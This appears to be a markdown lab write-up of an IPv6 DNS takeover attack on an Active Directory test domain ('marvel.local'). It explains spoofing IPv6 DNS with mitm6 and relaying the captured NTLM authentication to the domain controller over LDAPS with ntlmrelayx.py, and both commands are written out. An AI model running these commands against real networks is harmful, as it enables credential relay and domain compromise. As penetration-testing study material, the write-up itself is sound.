**IPv6 Attacks**

Most of the times system is using IPv4. Chances are that the machine is not utilizing IPv6. So if IPv6 is turned ON, and we are using IPv4, nobody is doing DNS resolution for IPv6.

We can set out attacker machin in the network to listin for all IPv6 DNS request. We can spoof the DNS server so all DNS traffic will pass by Attacker machine.

When this happens, we can get authentication from Domain controller via LDAP or via SMB.

We will reboot a machine, after reboothing the request will come to the attacker machine. We can use that machine to login at domain controller.

We will start a listner

***ntlmrelayx.py -6 -t ldaps://192.168.1.100 -wh fake.marvel.local -l IPv6_Attack***

<img width="720" height="198" alt="image" src="https://github.com/user-attachments/assets/ba6aa7c6-d195-42c9-bd36-cdc9b21dea07" />

<img width="720" height="451" alt="image" src="https://github.com/user-attachments/assets/b71ff09b-a977-46b0-8065-18eac6e3b247" />

***sudo mitm6 -d marvel.local***

<img width="720" height="465" alt="image" src="https://github.com/user-attachments/assets/0e72549a-7a59-4fd0-9b96-2486d0219ae3" />

Lets reboot the PUNISHER machine

<img width="720" height="430" alt="image" src="https://github.com/user-attachments/assets/babce1cc-576a-4639-95bb-c95af4b76fb4" />

Now, we can see on Successful authentication and details have been stored on the folder.

<img width="720" height="427" alt="image" src="https://github.com/user-attachments/assets/3048ccb2-c701-4f69-a7d9-6d834a788a26" />

Lets check

<img width="720" height="183" alt="image" src="https://github.com/user-attachments/assets/d1168fef-a7d3-4738-b048-5a0020d2aa86" />

<img width="720" height="347" alt="image" src="https://github.com/user-attachments/assets/d1f8dc4f-72a9-47ba-84a6-8f8d08552bc6" />
